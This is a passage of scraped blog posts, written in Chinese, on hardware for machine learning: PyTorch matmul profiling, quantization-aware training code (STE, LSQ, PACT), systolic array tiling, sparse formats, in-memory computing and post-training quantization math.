y.to(torch.int32) 11 1 171355.3 171355.3 99.2 return x @ y Total time: 0.0797359 s File: pytorch_type.py Function: int_16_matmul at line 13 Line # Hits Time Per Hit % Time Line Contents ============================================================== 13 @profile 14 def int_16_matmul(x, y): 15 1 314.3 314.3 0.4 x = x.to(torch.int16) 16 1 106.3 106.3 0.1 y = y.to(torch.int16) 17 1 79315.3 79315.3 99.5 return x @ y Total time: 0.048643 s File: pytorch_type.py Function: int_8_matmul at line 19 Line # Hits Time Per Hit % Time Line Contents ============================================================== 19 @profile 20 def int_8_matmul(x, y): 21 1 368.0 368.0 0.8 x = x.to(torch.int8) 22 1 123.3 123.3 0.3 y = y.to(torch.int8) 23 1 48151.7 48151.7 99.0 return x @ y Total time: 0.0488203 s File: pytorch_type.py Function: uint_8_matmul at line 25 Line # Hits Time Per Hit % Time Line Contents ============================================================== 25 @profile 26 def uint_8_matmul(x, y): 27 1 293.1 293.1 0.6 x = x.to(torch.uint8) 28 1 96.8 96.8 0.2 y = y.to(torch.uint8) 29 1 48430.4 48430.4 99.2 return x @ y   在这种情况下，浮点数乘法又要比整数乘法快很多，合理推测是pytorch对浮点数乘法的底层进行了优化。\n但如果将推理引擎由CPU换为GPU时，将会发生以下现象：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  Traceback (most recent call last): File \u0026#34;/home/yujin/anaconda3/envs/quant/bin/kernprof\u0026#34;, line 8, in \u0026lt;module\u0026gt; sys.exit(main()) File \u0026#34;/home/yujin/anaconda3/envs/quant/lib/python3.10/site-packages/kernprof.py\u0026#34;, line 264, in main execfile(script_file, ns, ns) File \u0026#34;/home/yujin/anaconda3/envs/quant/lib/python3.10/site-packages/kernprof.py\u0026#34;, line 32, in execfile exec(compile(f.read(), filename, \u0026#39;exec\u0026#39;), globals, locals) File \u0026#34;pytorch_type.py\u0026#34;, line 37, in \u0026lt;module\u0026gt; int_32_matmul(tensor_fp32, tensor_fp32_2) File \u0026#34;/home/yujin/anaconda3/envs/quant/lib/python3.10/site-packages/line_profiler/line_profiler.py\u0026#34;, line 130, in wrapper result = func(*args, **kwds) File \u0026#34;pytorch_type.py\u0026#34;, line 11, in int_32_matmul return torch.matmul(x, y) RuntimeError: \u0026#34;addmm_cuda\u0026#34; not implemented for \u0026#39;Int\u0026#39;   这说明目前的CUDA不支持直接加速整数矩阵乘法运算。\n","date":"2023-01-25T00:00:00Z","permalink":"https://ther-nullptr.github.io/posts/hardware-machine-learning/cost-of-torch-multiply/","title":"cost of torch multiply"},{"content":"本文将对QAT的一些基本算法做一些介绍，然后介绍两种较为直观也较为常用的QAT算法\nQAT 首先写出原始形式的量化式： $$ s \\cdot {\\rm clamp}(\\lfloor \\frac{x}{s} \\rceil;n,p) $$ 或： $$ s \\cdot [{\\rm clamp}(\\lfloor \\frac{x}{s} \\rceil + \\lfloor z \\rceil;n,p) - \\lfloor z \\rceil] $$ STE（直通估计器）最早在Estimating or Propagating Gradients Through Stochastic Neurons for Conditional Computation1中提出。由于round运算的梯度为0或未定义，STE将舍入算子的梯度近似为1：\n所以舍入值（权重和激活）相对于原值的导数可以定义为：\nLSQ 本文主要提出了两种方法：\n 提供了一种简单的方法来近似量化器步长的梯度，它对量化的状态转换很敏感，可以说在学习步长作为一个模型参数时提供了更精细的优化。 提出了一个简单的启发式方法，使步长更新的幅度与权重更新达到更好的平衡，以改善收敛性。  LSQ2这一工作引入了可学习的步长$s$:\nLSQ的巧妙之处在于，它模拟了量化过程中的一个现象：一个给定的$x_i$离量化过渡点越近，它就越有可能由于对$s$的更新改变其量化值$\\hat x_i$，导致$\\hat x_i$出现大幅度跳跃——梯度随着$x_i$到过渡点的距离减少而增加。\n在更新之前，激活和权重的初始步长值为： $$ s_{init} = \\frac{2\\bar x}{\\sqrt{p}} $$ 在训练过程中，我们期望步长参数随着精度的提高而变小（因为数据被更精细地量化），而步长更新随着量化项目的增加而变大（因为在计算其梯度时，更多的项目被加在一起）。对此我们需要将总损失与一个调节参数相乘：$g=1/\\sqrt{n p}$（$n$为每一层权重/激活的参数量）。同时将所有矩阵乘法层的输入激活和权重设置为2位、3位、4位或8位，但第一层和最后一层始终使用8位。\nLSQ+ LSQ方法大多基于以ReLU为激活函数的模型。但对于GeLU这样的函数，正负范围分布不均，无论是使用无符号量化范围量化（将所有负值钳制为0）还是使用有符号量化范围量化（对激活函数的负和正部分给予同等重视）都会造成精度损失。\nLSQ+3这一工作引入了可学习的偏置$z$:\n这样，我们就可以在激活处执行非对称量化，提高精度。\n对于权重，我们使用对称量化： $$ s_{init} = \\max(|\\mu - 3\\sigma|,|\\mu + 3\\sigma|) / 2^{b-1} $$ 对于激活，我们通过校准最小化下式： $$ s_{init}, \\beta_{init} = \\arg \\min_{s,\\beta} ||\\hat x - x||_F^2 $$\nPACT 本文解决了量化中的一个核心问题：如何在range和precision之间寻找到tradeoff。特别是对于激活来说，这一问题尤其严重。绝大多数activation集中在某个很小的范围，但总有一些outlier点 会离中心非常远。这些outlier的value比较大，如果删除的话，会造成较大的误差。但是，如果你用outlier的最大值来作为range来量化整个数据，又面临着precision不够的问题。\n传统的激活函数没有任何可训练的参数，因此量化激活产生的误差无法用BP算法补偿。而传统的ReLU函数输出值域是无界的，这造成了更大的动态范围误差。\nPACT函数的定义如下：\n$$ y = PACT(x) = 0.5 (|x| - |x-\\alpha| + \\alpha) $$\n随后是其量化过程：\n更新$\\alpha$的梯度表达式如下（注意到计算第一次倒数时使用了一个直通估计器）：\n注意到此处的scaling factor并非通过传统方法得到，因此量化表达式有较大的差异。重新改写上式：\n$$ s \\cdot {\\rm clamp}(\\lfloor \\frac{x}{s} \\rceil;0,\\alpha), s = \\frac{\\alpha}{2^k -1} $$\nCode 首先给出PyTorch中自定义求导算子的写法官方文档：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  class Exp(Function): @staticmethod def forward(ctx, i): result = i.exp() ctx.save_for_backward(result) return result @staticmethod def backward(ctx, grad_output): result, = ctx.saved_tensors return grad_output * result # Use it by calling the apply method: output = Exp.apply(input)   借助此，我们可以自定义函数的正向传播和反向传播过程。以下代码参考自45。\nSTE 首先我们给出BNN中STE（效果如下图所示）的表达式：\n1 2 3 4 5 6 7 8  class STEFunction(torch.autograd.Function): @staticmethod def forward(ctx, input): return (input \u0026gt; 0).float() @staticmethod def backward(ctx, grad_output): return F.hardtanh(grad_output)   在真正作为一个module使用时，需要进行封装：\n1 2 3 4 5 6 7  class StraightThroughEstimator(nn.Module): def __init__(self): super(StraightThroughEstimator, self).__init__() def forward(self, x): x = STEFunction.apply(x) return x   对于一般的round函数，其STE可以做如下构造：\n1 2 3 4 5 6 7 8  class STE(torch.autograd.Function): @staticmethod def forward(ctx, x): return torch.round(x) @staticmethod def backward(ctx, grad_output): return grad_output.clone()   我们可以看下这种写法和直接使用torch.round()函数的区别：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  # original print(\u0026#39;version 1\u0026#39;) x = torch.tensor([0., 100., 200.], requires_grad = True) out = x.round() loss = out.mean() loss.backward() print(x.grad) # modified print(\u0026#39;version 2\u0026#39;) x = torch.tensor([0., 100., 200.], requires_grad = True) out = STE.apply(x) loss = out.mean() loss.backward() print(x.grad)   1 2 3 4  version 1 tensor([0., 0., 0.]) version 2 tensor([0.3333, 0.3333, 0.3333])   可以看到，原生的round函数不产生任何梯度。\n此外，还有一种更精妙的写法：\n1 2 3 4  def round_pass(x): y = x.round() y_grad = x return y.detach() - y_grad.detach() + y_grad   此函数的意味是：函数的返回值为y - y_grad + y_grad = x.round()，但反向传播的梯度仍然按照y_grad = x的梯度去算。\n 按照此种写法还可以实现“梯度倍增”的效果：\n1 2 3 4  def grad_scale(x, scale): y = x y_grad = x * scale return y.detach() - y_grad.detach() + y_grad    LSQ LSQ的正向传播和反向传播在STE的基础上实现，同时还有初始化规则：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41  class LsqQuan(Quantizer): def __init__(self, bit, all_positive=False, symmetric=False, per_channel=True): super().__init__(bit) if all_positive: assert not symmetric, \u0026#34;Positive quantization cannot be symmetric\u0026#34; # unsigned activation is quantized to [0, 2^b-1] self.thd_neg = 0 self.thd_pos = 2 ** bit - 1 else: if symmetric: # signed weight/activation is quantized to [-2^(b-1)+1, 2^(b-1)-1] self.thd_neg = - 2 ** (bit - 1) + 1 self.thd_pos = 2 ** (bit - 1) - 1 else: # signed weight/activation is quantized to [-2^(b-1), 2^(b-1)-1] self.thd_neg = - 2 ** (bit - 1) self.thd_pos = 2 ** (bit - 1) - 1 self.per_channel = per_channel self.s = torch.nn.Parameter(torch.ones(1)) def init_from(self, x, *args, **kwargs): if self.per_channel: self.s = torch.nn.Parameter( x.detach().abs().mean(dim=list(range(1, x.dim())), keepdim=True) * 2 / (self.thd_pos ** 0.5)) else: self.s = torch.nn.Parameter(x.detach().abs().mean() * 2 / (self.thd_pos ** 0.5)) def forward(self, x): if self.per_channel: s_grad_scale = 1.0 / ((self.thd_pos * x.numel()) ** 0.5) else: s_grad_scale = 1.0 / ((self.thd_pos * x.numel()) ** 0.5) s_scale = grad_scale(self.s, s_grad_scale) x = x / s_scale x = torch.clamp(x, self.thd_neg, self.thd_pos) x = round_pass(x) x = x * s_scale return   LSQ+同理，只不过在原有基础上引入偏移量z，并使用不同的初始化规则，此处不再详细说明。\nPACT 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  class LearnedClippedLinearQuantization(nn.Module): def __init__(self, num_bits, init_act_clip_val, dequantize=True, inplace=False): super(LearnedClippedLinearQuantization, self).__init__() self.num_bits = num_bits self.clip_val = nn.Parameter(torch.Tensor([init_act_clip_val])) self.dequantize = dequantize self.inplace = inplace def forward(self, input): # Clip between 0 to the learned clip_val input = F.relu(input, self.inplace) # Using the \u0026#39;where\u0026#39; operation as follows gives us the correct gradient with respect to clip_val input = torch.where(input \u0026lt; self.clip_val, input, self.clip_val) with torch.no_grad(): scale, zero_point = asymmetric_linear_quantization_params(self.num_bits, 0, self.clip_val, signed=False) input = LinearQuantizeSTE.apply(input, scale, zero_point, self.dequantize, self.inplace) return input def __repr__(self): inplace_str = \u0026#39;, inplace\u0026#39; if self.inplace else \u0026#39;\u0026#39; return \u0026#39;{0}(num_bits={1}, clip_val={2}{3})\u0026#39;.format(self.__class__.__name__, self.num_bits, self.clip_val.item(), inplace_str)   Reference   http://arxiv.org/abs/1308.3432\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n http://arxiv.org/abs/2004.09576\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n http://arxiv.org/abs/2110.01900\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n https://zhuanlan.zhihu.com/p/72681647\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n https://github.com/zhutmost/lsq-net\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2023-01-25T00:00:00Z","permalink":"https://ther-nullptr.github.io/posts/hardware-machine-learning/qat%E4%B8%B2%E8%AE%B2%E5%92%8C%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0/","title":"QAT串讲和代码实现"},{"content":"Mapping systolic array为我们提供了一种很好的并行化方法，然而在实际运行中可能存在一些问题：比如systolic array的尺寸过小，无法载入整个权重等。这时就需要插入一些mapping的技巧。\n我们先贴出原版的systolic array代码：\n1 2 3 4 5 6 7 8 9 10 11  for (m = 0; m \u0026lt; M; m++) { spatial_for(n = 0; n \u0026lt; N; n++) { OA[n, m] = 0; spatial_for(k = 0; k \u0026lt; K; k++) { OA[n, m] += IA[m, k] * W[k, n]; } } }   case 1: systolic array的尺寸小于K or N\n这意味着weight无法一次性载入到整个systolic array中，以下为分块载入的代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  for (m = 0; m \u0026lt; M; m++) { for (n1 = 0; n1 \u0026lt; N1; n1++) { OA [n1 * N0:(n1 + 1) * N0, m] = 0; for (k1 = 0; k1 \u0026lt; K1; k1++) { spatial_for(n0 = 0; n0 \u0026lt; N0; n0++) { spatial_for(k0 = 0; k0 \u0026lt; K0; k0++) { OA[n1 * N0 + n0, m] += IA[m, k1 * K0 + k0] * W[k1 * K0 + k0, n1 * N0 + n0]; } } } } }   这里N0*N1=N，K0*K1=K，systolic array的尺寸大小为N0*K0，取块的方式如下：\ncase 2：weight buffer小于systolic array的size，也就是说，weight不能被一次性载入到systolic array，下为代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  for (m = 0; m \u0026lt; M; m++) { // IA buffer stores: 1*K  mvin(IA [m:m + 1, 0:K]); for (n2 = 0; n2 \u0026lt; N2; n2++) { // W buffer stores: N1*N0*K \u0026lt; NK  mvin(W [0:K, n2 * N1 * N0:(n2 + 1) * N1 * N0]); OA [n2 * N1 * N0:(n2 + 1) * N1 * N0, m:m + 1] = 0; for (n1 = 0; n1 \u0026lt; N1; n1++) { for (k1 = 0; k1 \u0026lt; K1; k1++) { spatial_for(n0 = 0; n0 \u0026lt; N0; n0++) { spatial_for(k0 = 0; k0 \u0026lt; K0; k0++) { OA[n2 * N1 * N0 + n1 * N0 + n0, m] += IA[m, k1 * K1 + k0] * W[k1 * K0 + k0, n2 * N1 * N0 + n1 * N0 + n0]; } } } } mvout(OA [n2 * N1 * N0:(n2 + 1) * N1 * N0, m:m + 1]); } }    这里只考虑了weight buffer在N维度上不够的情况，即N=N0*N1*N2。映射方式如下：\n case 3：input buffer小于systolic array的size，也就是说，input不能被一次性载入到systolic array，下为代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  for (m2 = 0; m2 \u0026lt; M2; m2++) { // IA buffer stores: M1*K  mvin(IA [m2 * M1:(m2 + 1) * M1, 0:K]); for (n2 = 0; n2 \u0026lt; N2; n2++) { // W buffer stores: N1*N0*K  mvin(W [0:K, n2 * N1 * N0:(n2 + 1) * N1 * N0]); OA [n2 * N1 * N0:(n2 + 1) * N1 * N0, m2 * M1:(m2 + 1) * M1] = 0; for (m1 = 0; m1 \u0026lt; M1; m1++) { for (n1 = 0; n1 \u0026lt; N1; n1++) { for (k1 = 0; k1 \u0026lt; K1; k1++) { spatial_for(n0 = 0; n0 \u0026lt; N0; n0++) { spatial_for(k0 = 0; k0 \u0026lt; K0; k0++) { OA[n2 * N1 * N0 + n1 * N0 + n0, m2 * M1 + m1] += IA[m2 * M1 + m1, k1 * K1 + k0] * W[k1 * K0 + k0, n2 * N1 * N0 + n1 * N0 + n0]; } } } } } mvout(OA [n2 * N1 * N0:(n2 + 1) * N1 * N0, m2 * M1:(m2 + 1) * M1]); } }   解决了上述的特殊情况之后，我们还需要解决一个问题：什么样的循环写法是最优的，例如对于case 3的代码，我们可以有如下两种写法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  for (m2 = 0; m2 \u0026lt; M2; m2++) { // IA buffer stores: M1*K  mvin(IA [m2 * M1:(m2 + 1) * M1, 0:K]); for (n2 = 0; n2 \u0026lt; N2; n2++) { // W buffer stores: N1*N0*K  mvin(W [0:K, n2 * N1 * N0:(n2 + 1) * N1 * N0]); compute_matmul(*W, *IA, *OA, N2, N1, N0, M2, M1, K1, K0, m2, n2); mvout(OA [n2 * N1 * N0:(n2 + 1) * N1 * N0, m2 * M1:(m2 + 1) * M1]); } } for (n2 = 0; n2 \u0026lt; N2; n2++) { // W buffer stores: N1*N0*K  mvin(W [0:K, n2 * N1 * N0:(n2 + 1) * N1 * N0]); for (m2 = 0; m2 \u0026lt; M2; m2++) { // IA buffer stores: M1*K  mvin(IA [m2 * M1:(m2 + 1) * M1, 0:K]); compute_matmul(*W, *IA, *OA, N2, N1, N0, M2, M1, K1, K0, m2, n2); mvout(OA [n2 * N1 * N0:(n2 + 1) * N1 * N0, m2 * M1:(m2 + 1) * M1]); } }   如何判断两种循环的优劣？我们需要统计据的搬移量：\n针对这两种循环，我们可以设置不同的并行机制（即在不同位置使用spatial_for）。总而言之，设置loop的顺序本质上是一个优化问题，给定：维度数和硬件参数，最优化：能量/延迟。\nSparsity ReLU函数的存在使得activation中存在大量的0，同理也可以通过剪枝使得weight中存在大量的0。\n这为我们存储数值提供了机会：\n  bitmask：使用0/1数组表示是否为0（会造成独立于密度的固定开销，对高密度不友好）\n  run-length encoding：游程编码（同样有固定开销）\n  compressed sprase row：（可以进行快速的行选取）\n这其中的col index直接记录其列号，而bound中的第i个数字记录了前i-1行包含的非0元素的数量。例如我们如果需要选取第三行的数字，由于Bounds[2]=3，Bounds[3]=5，我们可以得知在第三行的数字于value中的下标为[3,5)，据此可以直接取用数字。\n  compressed sprase column：（可以进行快速的列选取）\n  随后稀疏矩阵和密集矩阵的混合计算。按照操作数的稀疏性和对齐方式分为两种：\n  Indirection：使用稀疏矩阵中非0元素的下标去索引密集矩阵中的元素。\n场景：算式y[i] = A[i, j] * x[j]，A的第二维是稀疏的，x是密集的。可以想到循环次数要小于len(x)，为len(A_index[1])。\n  Intersection：寻找权重和激活中均不为0的数值。\n场景：算式y[i] = A[i, j] * x[j]，A的第二维是稀疏的，x是稀疏的（想象两个指针在非0下标数组上同时滑动的场景）。\n  Arbitration：先计算，之后在输出的矩阵中决定这些结果的位置。\n场景：算式A[i, j] = B[i, k] * C[k, j]，B和C第二维均是稀疏的，我们先将两者“浓缩”的矩阵进行相乘，然后在输出中决定其位置。\n  Near-Data Processing 在之前的几节中，我们介绍的主要是Fully Connected和Conv两个深度学习的算子，这两者本质上都可以划归为GEMM（通用矩阵乘）。GEMM中的基本单元是MAC乘加单元，它包括2个operator，load 2个数据，然后将1个结果store进寄存器中。\n深度学习中其实还有一些其他的算子，它们在operator、load、store上都和GEMM有很大的不同。举例说明：\nElement-wise operation：逐元素运算，例如LSTM的Hadama积，ResNet中的残差相加。它包括1个operator，load 2个数据，然后将1个结果store进寄存器中。\n 这里需要特别强调的是残差相加，尽管没有引入额外的参数或者是计算复杂度，但仍然会导致减速，这是由于该操作增加了高速缓存的处理量，对之前数据的储存增加了内存负担。\n Embedding Layer：嵌入运算。这一运算的本质是将id序列（例如词序号等）转换为one-hot向量之后，与Embedding大矩阵相乘，得到对应的词嵌入。不过实际操作中一般不使用这种类似于GEMM的运算，而是基于id序列对Embedding大矩阵进行一种类似于查找表的运算。因此它需要1个operator，load 2个数据，然后将1个结果store进寄存器中。\n实际上，上述的一些算子在深度学习之外的一些领域也有用，如GC（Java中的垃圾回收机制）、LINQ（语言集成查询）等。我们可以用上述算子构建Near-Data Processing的专用硬件（这里的Near-Data Processing指的是具有直接访问DRAM的功能，而不需要通过高速缓存的层次结构的硬件）。\nIn Memory Computing 在介绍IMC之前，我们需要首先回顾一下存储器的分类：\n Random Access Memory(RAM): 随机存取存储器，其“随机存取”指的是当存储器中的消息被读取或写入时，所需要的时间与这段信息所在的位置无关。  SRAM：静态随机存取存储器，其“静态”指的是这种存储器只要保持通电，里面存储的数据就可以恒常保持。多用于高速cache。 DRAM：动态随机存取存储器，其“动态”指的是由于晶体管会有漏电电流的现象，导致电容上所存储的电荷数量并不足以正确的判别数据，进而导致数据毁损，所以DRAM需要经常性刷新。多用于廉价内存。 Flash：闪存，与DRAM和SRAM不同的是掉电后数据不会被清除，但读写速度会慢。   Serial Access Memory(SAM): 顺序存取存储器需要按顺序读取存储数据。 Content Addressable Memory(CAM): 可以根据其内容而不是其名称或位置进行检索。它已被用于固定内容的高速存储和检索。  以下将重点计算在SRAM中进行的存内计算：\n在Deep Learning等数据密集型的运算场景中，数据搬移的消耗将超越数据运算。一个直观的思路是在存储器中进行运算，而不是将数据从存储器中搬移出来后进行运算（例如，对于一个weight stationary的dataflow，权重只需要呆在存储器中，无需进行搬运）。这就是存内计算的基本思想。\n需要指出的是，目前的存内计算大部分是在模拟域进行的。因此需要先将数字化的输入经过DAC之后与权重进行运算，之后通过ADC变换回数字域。\n这样我们就得到了IMC中数据的传输范式：\n input activation：被DAC转换为电压值，位于SRAM的WL（word line）上。 output activation：在SRAM的BL（bit line）上进行累加。 weight：储存于存储单元，无需搬移。  例如在这项工作中，一个5位数模转换器被用来驱动字线（WL）到代表特征向量的模拟电压，而位单元存储二进制权重±1。位单元的电流（IBC）实际上是特征向量的值和存储在位单元中的权重值的乘积；来自一列中的位单元的电流加在一起对位线（VBL）放电。\n存内计算为什么在模拟域中进行？一个好处是其加法可以直接借助基尔霍夫定律中电流的相加，而无需借助额外的硬件，但模拟电路中的不稳定，精度难以控制也造成存内计算难以落地的窘境。\n 例如，在模拟场景下，我们如果想要实现维度更高的阵列，就需要更长的导线，然而这会导致更大的寄生电容。\n 同时，目前的存内计算大多集中于推理阶段，而非训练阶段。这是由于这一技术更擅长于数据的读而非写，例如在更新权重序列的数据时需要更大的电压。\n与此同时，现有的深度学习IMC工作大多数基于BNN（二值网络），位宽的限制使其效果无法与传统数字电路媲美。\n","date":"2023-01-14T00:00:00Z","permalink":"https://ther-nullptr.github.io/posts/hardware-machine-learning/ee-290-lab-3/","title":"EE290-2 LAB3 tiling and optimization for accelerator"},{"content":"Dataflow 乘加累计单元 机器学习中的核心计算单元被称为乘積累加单元（Multiply Accumulate, MAC）。它使用一条指令进行以下运算： $$ a \\leftarrow a + b \\times c $$\n为减小其数据搬移所造成的的开销，我们需要关注其数据的重复使用，对此我们采取以下方法：\n Temporal reuse：单个数据被同一个计算单元重复使用多次 Spatial reuse：单个数据被多个不同的计算单元同时使用  OS Dataflow \u0026amp; WS Dataflow 基于这样的思想，我们可以设计两种不同的dataflow（以下的代码以1D conv为例）：\n Output Stationary Dataflow：输出的同一数据在时间上相邻，便于输出数据的重用  1 2 3 4 5 6 7  for (q=0; q\u0026lt;Q; q++) // 输出的循环位于外层 { for (s=0; s\u0026lt;S; s++) { OA[q] += IA[q+s] * W[s]; } }   这一重用可以在output侧加入寄存器实现：  Weight Stationary Dataflow：权重的同一数据在时间上相邻，便于权重数据的重用  1 2 3 4 5 6 7  for (s=0; s\u0026lt;S; s++) // 权重的循环位于外层 { for (q=0; q\u0026lt;Q; q++) { OA[q] += IA[q+s] * W[s]; } }   这一重用可以在weight侧加入寄存器实现： Accelerator 接下来，我们将在乘加单元的基础上探索更加宏观层面的矩阵乘法的高效数据流计算。\n首先我们写出一般矩阵乘法的计算流：\n1 2 3 4 5 6 7 8  for (m=0; m\u0026lt;M; m++) { for (n=0; n\u0026lt;N; n++) { OA[n,m] = 0; for (k=0; k\u0026lt;K; k++) { OA[n,m] += IA[m, k] * W[k, n]; } } }   数据的并行化大致可以分为两种方法：Spatial-K和Spatial-N。\nSpatial-K旨在将IA中一行和W中一列的计算并行化：\n1 2 3 4 5 6 7 8  for (m=0; m\u0026lt;M; m++) { for (n=0; n\u0026lt;N; n++) { OA[n,m] = 0; spatial_for (k=0; k\u0026lt;K; k++) { OA[n,m] += IA[m, k] * W[k, n]; } } }   Spatial-N旨在将W中的一行进行广播：\n1 2 3 4 5 6 7 8  for (m=0; m\u0026lt;M; m++) { spatial_for (n=0; n\u0026lt;N; n++) { OA[n,m] = 0; for (k=0; k\u0026lt;K; k++) { OA[n,m] += IA[m, k] * W[k, n]; } } }   当然，我们也可以将其进行组合：\n1 2 3 4 5 6 7 8  for (m=0; m\u0026lt;M; m++) { spatial_for (n=0; n\u0026lt;N; n++) { OA[n,m] = 0; spatial_for (k=0; k\u0026lt;K; k++) { OA[n,m] += IA[m, k] * W[k, n]; } } }   Adder Tree 加法树（Adder Tree）采用了一种以空间换取时间的策略。为了同时计算多个IA[m, k] * W[k, n]，可以将多个加法器堆叠组成树状结构：\nDirect-Wiring Multicast 将权重的一行进行广播，使得权重的N列可以同时计算：\nSystolic Array 脉动阵列（Systolic Array）既可以实现Spatial-K中的加速（Systolic Accleration）功能，也可以实现Spatial-N中的广播（Systoic Multicast）功能。这里我们直接将两者组合以说明其功能。\n考虑一个基本的矩阵乘法$C=AB$，weight stationary的systolic array计算方式如下：\n1 2 3 4 5 6 7 8 9 10 11 12  // stage 1 c_11 = a_11 * b_11 // stage 2 c_11 += a_12 * b_21 c_12 = a_11 * b_12 c_21 = a_21 * b_11 // stage 3 c_12 += a_12 * b_22 c_21 += a_22 * b_21 c_22 = a_21 * b_12 // stage 4 c_22 += a_22 * b_22   如果考虑到$B$的预装，计算方式改为：\n1 2 3 4 5 6 7 8  // stage 1 move B and do not load // stage 2 load b_11, b_21 // stage 3 load b_12, b_22 c_11 = a_11 * b_11 // stage 4 and after same as systolic-1   这会带来一个问题：在预装B的时候，我们不能做任何有用的工作。所以，每一个处理单元必须要有至少两个寄存器来存储它负责的B上的元素。在任何特定的周期中，一个寄存器将用于执行乘法累加操作，而另一个寄存器将作为预加载过程的一部分向下传播B的元素。\n这仍然遗留了一个问题：如果我们想保留之前预装的矩阵，而不是用一个新的矩阵来覆盖它，怎么办？我们如何将其传达给收缩阵列的处理单元？对此可以引入一个1 bit的信号量。\n如果传播信号为0，那么第1个寄存器（寄存器0）应该用于向下传播权重，而第2个寄存器（寄存器1）应该用于乘法累加。同样，如果传播信号为1，那么第1个寄存器（寄存器0）应该被用来进行乘法累加，而第2个寄存器（寄存器1）应该被用来向下传播权重。\n以下是$\\alpha \\times \\beta = \\gamma$和$A \\times B = C$的例子：由于$\\beta$的标识均为0，所以$\\beta$由寄存器0向下传播；当$\\beta$准备用于计算时，$b$被载入，由于传输信号为1，$b$由寄存器1向下传播，而寄存器0用于乘法的计算。\n同理有$\\alpha \\times \\beta = \\gamma$，$A \\times \\beta = C$, $\\alpha \\times Y = Z$的数据流。\n","date":"2023-01-11T00:00:00Z","permalink":"https://ther-nullptr.github.io/posts/hardware-machine-learning/ee-290-lab-2/","title":"EE290-2 LAB2 hardware implementation of machine learning systems"},{"content":"本节用到的公式虽然基础，但想要真正理清楚公式之间的关系还是比较麻烦的（博主就被绕晕过）。新人首秀，多多指教~\nassignment 本实验是UC Berkeley EECS 本科课程Hardware for Machine Learning的第1个lab。本lab要求将一个简单的LeNet以不同的方式进行量化，并在CIFAR 10数据集上进行测评。具体要求见本文档。\n关于量化(quantization)的基本公式本文不再赘述，详见1。本文主要关注量化的代码实现细节。\nmethod 流程 本文主要介绍静态训练后量化（static post training quantization）。其流程如下：\n 在浮点环境下训练模型。 使用少量的校正数据，确定激活（activation，即经过中间层的数据流）的数据分布，并得到其scaling factor和zero point（本文简单起见，在量化时不使用zero point，scaling factor使用最常规的公式得到：$S = \\frac{r_{\\max}-r_{\\min}}{q_{\\max}-q_{\\min}}$），用于后续的推理2。 量化权重（weight）、偏置（bias，可选）和激活，进行全整数推理。  关于weight和activation的量化 假设一个神经网络由$W_1, W_2, W_3\\cdots$若干层组成（此处我们假设它们均为线性层，但其他如卷积层等同理）。\n$$ O_1 = IW_1 $$\n$$ W_{1q} = {\\rm clamp}({\\rm round}(\\frac{W_1}{S_{W_1}}), \\min,\\max) $$\n$$ I_{q} = {\\rm clamp}({\\rm round}(\\frac{I}{S_I}), \\min,\\max) $$\n我们可以得到使用$W_q$和$S_q$重建的$W_r$，$I_r$同理： $$ W_{1r} = S_{W_1}W_{1q} \\approx W_1 $$\n$$ I_r = S_II_q \\approx I $$\n则： $$ O_1 \\approx W_{1r}I_r \\approx S_{W_1}S_IW_{1q}I_q $$\n 为方便起见，我们在代码中将$W_{1q}I_q$记做$R_1$，将$W_{2q}O_{1q}$记作$R_2$，以此类推。\n 注意到此处$W_{1r}$和$I_r$均为整数，$S_{W_1}$和$S_I$均为浮点数，则$O$也为浮点数。但当$O$进入下一个计算模块时，同样需要进行整数量化：\n$$ O_{1q} = {\\rm clamp}({\\rm round}(\\frac{O_1}{S_{O_1}}), \\min,\\max) \\approx \\frac{S_{W_1}S_I}{S_{O_1}}W_{1q}I_q $$\n$$ O_{1r} = S_{O_1}O_{1q} \\approx O_1 $$\n而此处的$\\frac{S_{W_1}S_I}{S_{O_1}}$同样可以化为整数的形式，即$\\frac{S_{W_1}S_I}{S_{O_1}}\\approx2^{-n}$，从而实现真正意义的全整数推理。\n对于第二层参数，我们同样有： $$ O_{2} \\approx W_{2r}O_{1r} \\approx S_{W_2}S_{O_1}W_{2q}O_{1q} $$\n$$ O_{2q} = {\\rm clamp}({\\rm round}(\\frac{O_2}{S_{O_2}}), \\min,\\max) \\approx \\frac{S_{W_2}S_{O_1}}{S_{O_2}}W_{2q}O_{1q} $$\n当计算到最后一层第$n$层时，我们无需获取$S_{O_n}$（因为计算它的唯一目的在于进行后一层的整数推理），于是我们有：\n$$ O_{n} \\approx O_{nr} = O_{nq}S_{O_n} = S_{W_n}S_{O_{n-1}}W_{nq}O_{(n-1)q} $$\n 实际上，此处是否获取$S_{O_n}$无关紧要。例如，若此处进行的是图像分类任务，我们需要求出的实际上只是数量之间的比例关系，而不是数量本身。\n 综上，我们可以得出每一层的scaling factor $S_i$：\n 输入：$S_I$ 中间层：$\\frac{S_{O_1}}{S_{W_1}S_{I}}, \\frac{S_{O_2}}{S_{W_2}S_{O_1}}, \\cdots, \\frac{S_{O_n}}{S_{W_n}S_{O_{n-1}}}$  令$\\frac{S_{O_i}}{S_{W_i}S_{O_{i-1}}}=S_i$（当i=0时，$S_{O_{i-1}}$化为$S_I$），则也可以使用递归的方法写作：\n$$ S_i = \\begin{cases} \\frac{S_{O_1}}{S_{W_1}S_I}, i = 1 \\ \\frac{S_{O_i}}{S_{W_i}S_I\\prod_1^{i-1}(S_kS_{W_k})}, i \u0026gt; 1 \\end{cases} $$\n关于bias的量化 在量化中处理bias有两种较为简单的办法：\n 使用无bias的模型。 